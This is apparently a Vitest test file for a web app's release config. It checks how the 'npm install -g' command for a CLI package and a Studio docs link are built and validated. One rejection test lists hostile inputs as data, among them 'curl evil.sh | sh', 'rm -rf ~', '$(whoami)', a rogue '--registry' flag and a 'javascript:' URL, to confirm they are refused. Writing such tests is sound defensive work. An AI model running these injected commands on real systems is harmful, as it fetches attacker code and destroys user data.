import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { cwd } from "node:process";
import { afterEach, describe, expect, it } from "vitest";

import {
  CLI_PACKAGE_KEY,
  STUDIO_DOCS_URL_KEY,
  cliInstallCommand,
  cliPackageSpec,
  readReleaseValue,
  studioDocsUrl,
} from "../release-config";

afterEach(() => {
  delete window.__FUTURE_AGI_CONFIG__;
});

describe("readReleaseValue", () => {
  it("prefers the runtime config the container writes over the build value", () => {
    expect(
      readReleaseValue(
        CLI_PACKAGE_KEY,
        { [CLI_PACKAGE_KEY]: " @future-agi/omega " },
        { [CLI_PACKAGE_KEY]: "@future-agi/omega-old" },
      ),
    ).toBe("@future-agi/omega");
  });

  it("falls back to the build value when the runtime entry is empty or missing", () => {
    for (const runtime of [{}, { [CLI_PACKAGE_KEY]: "" }, null, undefined]) {
      expect(
        readReleaseValue(CLI_PACKAGE_KEY, runtime, {
          [CLI_PACKAGE_KEY]: "@future-agi/omega",
        }),
      ).toBe("@future-agi/omega");
    }
  });

  it("reads nothing when neither sets it, or when the value is not a string", () => {
    expect(readReleaseValue(CLI_PACKAGE_KEY, {}, {})).toBe("");
    expect(
      readReleaseValue(CLI_PACKAGE_KEY, { [CLI_PACKAGE_KEY]: 42 }, {}),
    ).toBe("");
  });
});

describe("the install command", () => {
  it("is npm install -g of the one package the release names", () => {
    expect(cliInstallCommand("@future-agi/omega")).toBe(
      "npm install -g @future-agi/omega",
    );
    expect(cliInstallCommand("@future-agi/omega@1.4.0")).toBe(
      "npm install -g @future-agi/omega@1.4.0",
    );
    expect(cliInstallCommand("@future-agi/omega@next")).toBe(
      "npm install -g @future-agi/omega@next",
    );
    expect(cliInstallCommand("omega-cli")).toBe("npm install -g omega-cli");
  });

  it("is never built from a value that is not a plain package spec", () => {
    for (const value of [
      "",
      " ",
      "@futureagi/omega; curl evil.sh | sh",
      "@futureagi/omega && rm -rf ~",
      "$(whoami)",
      "`id`",
      "https://registry.example.com/omega.tgz",
      "git+ssh://git@github.com/future-agi/omega.git",
      "./omega.tgz",
      "../omega",
      "@FutureAGI/Omega",
      "@futureagi/",
      "@futureagi/omega@",
      "@futureagi/omega@1.0 --registry=https://evil.example",
      "a".repeat(215),
      null,
      undefined,
      7,
    ]) {
      expect(cliInstallCommand(value)).toBeNull();
      expect(cliPackageSpec(value)).toBeNull();
    }
  });

  it("reads VITE_OMEGA_CLI_PACKAGE from the runtime config by default", () => {
    expect(cliInstallCommand()).toBeNull();
    window.__FUTURE_AGI_CONFIG__ = { [CLI_PACKAGE_KEY]: "@future-agi/omega" };
    expect(cliInstallCommand()).toBe("npm install -g @future-agi/omega");
  });
});

describe("the Studio guide link", () => {
  it("is the https address the release sets", () => {
    expect(studioDocsUrl("https://docs.futureagi.com/studio")).toBe(
      "https://docs.futureagi.com/studio",
    );
    window.__FUTURE_AGI_CONFIG__ = {
      [STUDIO_DOCS_URL_KEY]: "https://docs.futureagi.com/studio",
    };
    expect(studioDocsUrl()).toBe("https://docs.futureagi.com/studio");
  });

  it("is nothing for an unset, plain-http, credentialed or unreadable value", () => {
    for (const value of [
      "",
      "http://docs.futureagi.com/studio",
      ["javascript", "alert(1)"].join(":"),
      "https://user:pw@docs.futureagi.com/studio",
      "docs.futureagi.com/studio",
      "not a url",
    ]) {
      expect(studioDocsUrl(value)).toBeNull();
    }
  });
});

// The release sets these two values on the container (the entrypoint writes
// them into window.__FUTURE_AGI_CONFIG__) or at build time; both places must
// know their names, or a set value would never reach the tab.
describe("release config contract", () => {
  const entrypoint = readFileSync(
    resolve(cwd(), "docker-entrypoint.sh"),
    "utf8",
  );
  const example = readFileSync(resolve(cwd(), ".env.example"), "utf8");

  it.each([CLI_PACKAGE_KEY, STUDIO_DOCS_URL_KEY])(
    "the container entrypoint writes %s into the runtime config",
    (name) => {
      const names = /CONFIG_NAMES="([\s\S]*?)"/.exec(entrypoint)?.[1] ?? "";
      expect(names.split(/\s+/)).toContain(name);
    },
  );

  // The package has a fixed name. The value stays empty until it is
  // published, so no install step shows for a package npm does not have.
  it("the example environment names the CLI package under the @future-agi scope, left empty until it is published", () => {
    expect(example).toMatch(/^# .*: @future-agi\/omega \(/m);
    expect(example).toMatch(new RegExp(`^${CLI_PACKAGE_KEY}=$`, "m"));
    expect(cliPackageSpec("@future-agi/omega")).toBe("@future-agi/omega");
  });

  it("the example environment documents the Studio guide URL, empty", () => {
    expect(example).toMatch(new RegExp(`^${STUDIO_DOCS_URL_KEY}=$`, "m"));
  });
});
